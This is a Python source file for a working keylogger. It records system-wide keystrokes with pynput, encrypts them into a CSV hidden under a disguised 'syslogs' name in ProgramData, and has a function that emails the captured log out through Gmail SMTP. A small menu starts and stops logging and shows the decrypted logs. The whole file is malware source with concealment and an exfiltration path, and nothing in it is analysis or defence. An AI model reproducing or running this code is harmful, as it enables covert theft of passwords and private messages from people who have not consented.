import os
import csv
import time
import smtplib
import base64
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from cryptography.fernet import Fernet
from pynput import keyboard
from tkinter import Tk, Text, Button

# Generate or load encryption key
KEY_FILE = "encryption.key"
LOG_FILE = "C:\\ProgramData\\syslogs.csv"  # Hidden location for Windows

running = False  # Flag to control keylogger state

def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)

def load_key():
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()

def encrypt_message(message, key):
    cipher = Fernet(key)
    return cipher.encrypt(message.encode()).decode()

def decrypt_message(encrypted_message, key):
    cipher = Fernet(key)
    return cipher.decrypt(encrypted_message.encode()).decode()

generate_key()
encryption_key = load_key()

# Ensure the log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["Date", "Time", "Message"])

message_buffer = ""

def on_press(key):
    global message_buffer, running
    if not running:
        return
    try:
        if key == keyboard.Key.space:
            message_buffer += " "
        elif key == keyboard.Key.enter:
            save_message(message_buffer)
            message_buffer = ""
        elif hasattr(key, 'char') and key.char is not None:
            message_buffer += key.char
    except AttributeError:
        pass

def save_message(message):
    with open(LOG_FILE, "a", newline="") as file:
        writer = csv.writer(file)
        timestamp = time.strftime('%Y-%m-%d'), time.strftime('%H:%M:%S')
        encrypted_message = encrypt_message(message, encryption_key)
        writer.writerow([*timestamp, encrypted_message])

def send_email(receiver_email):
    sender_email = "your_email@gmail.com"
    sender_password = "your_password"
    
    with open(LOG_FILE, "rb") as f:
        log_content = f.read()
        encoded_log = base64.b64encode(log_content).decode()
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Encrypted Keylogger Logs"
    msg.attach(MIMEText(encoded_log, 'plain'))
    
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
    except Exception as e:
        print("Failed to send email:", e)

def toggle_keylogger():
    global running
    running = not running
    status = "started" if running else "stopped"
    print(f"Keylogger {status}.")

def view_logs():
    decryption_key = encryption_key  # Load the stored encryption key
    decrypted_data = []
    
    try:
        with open(LOG_FILE, "r") as file:
            reader = csv.reader(file)
            next(reader)  # Skip header
            for row in reader:
                if len(row) == 3:
                    date, time, enc_message = row
                    dec_message = decrypt_message(enc_message, decryption_key)
                    decrypted_data.append(f"{date} {time}: {dec_message}")
    except Exception as e:
        decrypted_data.append(f"Error decrypting the file: {e}")
    
    def show_log_window():
        log_window = Tk()
        log_window.title("Decrypted Logs")
        log_window.geometry("600x400")
        
        text_area = Text(log_window, wrap="word")
        text_area.pack(expand=True, fill="both")
        text_area.insert("1.0", "\n".join(decrypted_data))
        
        close_button = Button(log_window, text="Close", command=log_window.destroy)
        close_button.pack()
        
        log_window.mainloop()
    
    threading.Thread(target=show_log_window).start()

def main():
    print("Keylogger initialized. Use the menu options to start/stop logging and view logs.")
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    while True:
        print("\nOptions:")
        print("1. Start/Stop Keylogger")
        print("2. View Logs")
        print("3. Exit")
        
        choice = input("Enter choice: ")
        if choice == "1":
            toggle_keylogger()
        elif choice == "2":
            view_logs()
        elif choice == "3":
            break
        else:
            print("Invalid choice, try again.")

if __name__ == "__main__":
    main()
